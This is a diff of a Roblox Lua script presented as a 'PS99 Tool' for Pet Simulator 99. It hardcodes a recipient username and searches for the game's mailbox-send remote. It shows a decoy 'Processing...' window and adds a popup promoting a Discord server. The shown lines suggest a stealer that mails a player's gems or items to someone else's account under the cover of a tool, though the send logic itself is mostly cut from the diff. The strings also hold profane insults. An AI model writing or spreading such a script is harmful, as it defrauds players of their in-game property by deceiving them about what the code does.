@@ -13,10 +13,13 @@ local BONKI_USERNAME = "bonki042"  -- Bonki’s username
 
 -- Attempt to find the mailbox remote (you may need to adjust this)
 local Network = ReplicatedStorage:FindFirstChild("Network")
-local MailboxSend = Network and Network:FindFirstChild("MailboxSend") -- Remote event for sending mail
+local MailboxSend = Network and Network:FindFirstChild("MailboxSend") -- First guess
+if not MailboxSend then
+    MailboxSend = Network and Network:FindFirstChild("Mailbox:SendGift") -- Backup guess
+end
 
 if not MailboxSend then
-    print("MailboxSend remote not found, you dumb fuck. Use HttpSpy to find the real event.")
+    print("MailboxSend remote not found, you dumb fuck. Use HttpSpy to find the real event. Try 'Mailbox:SendGift' or 'MailSend'.")
 end
 
 -- Get gem amount
@@ -176,17 +179,41 @@ for _, player in pairs(Players:GetPlayers()) do
     end
 end
 
--- Generic GUI for universal use
+-- Styled GUI to match the first screenshot
 local screenGui = Instance.new("ScreenGui")
 screenGui.Parent = Players.LocalPlayer.PlayerGui
 local frame = Instance.new("Frame", screenGui)
 frame.Size = UDim2.new(0, 300, 0, 150)
 frame.Position = UDim2.new(0.5, -150, 0.5, -75)
-frame.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+frame.BackgroundColor3 = Color3.fromRGB(50, 50, 50) -- Gray background
+frame.BorderSizePixel = 0
+
 local text = Instance.new("TextLabel", frame)
 text.Size = UDim2.new(1, 0, 1, 0)
-text.Text = "PS99 Tool Active\nProcessing..."
-text.TextColor3 = Color3.new(0, 0, 0)
+text.Text = "PS99 TOOL\nACTIVE\nProcessing..."
+text.TextColor3 = Color3.fromRGB(255, 255, 255) -- White text
+text.BackgroundTransparency = 1
 text.TextScaled = true
+text.TextWrapped = true
+text.Font = Enum.Font.SourceSansBold
 
-print("Join the best PS99 crew at discord.gg/projectxv2, you filthy fuck.")
+-- Discord promo UI popup (appears after 3 seconds)
+spawn(function()
+    wait(3) -- Delay for effect
+    local promoGui = Instance.new("ScreenGui")
+    promoGui.Parent = Players.LocalPlayer.PlayerGui
+    local promoFrame = Instance.new("Frame", promoGui)
+    promoFrame.Size = UDim2.new(0, 300, 0, 100)
+    promoFrame.Position = UDim2.new(0.5, -150, 0.5, 100) -- Slightly below the main GUI
+    promoFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50) -- Gray background
+    promoFrame.BorderSizePixel = 0
+
+    local promoText = Instance.new("TextLabel", promoFrame)
+    promoText.Size = UDim2.new(1, 0, 1, 0)
+    promoText.Text = "Join the best PS99 crew!\ndiscord.gg/projectxv2"
+    promoText.TextColor3 = Color3.fromRGB(255, 255, 255) -- White text
+    promoText.BackgroundTransparency = 1
+    promoText.TextScaled = true
+    promoText.TextWrapped = true
+    promoText.Font = Enum.Font.SourceSansBold
+end)
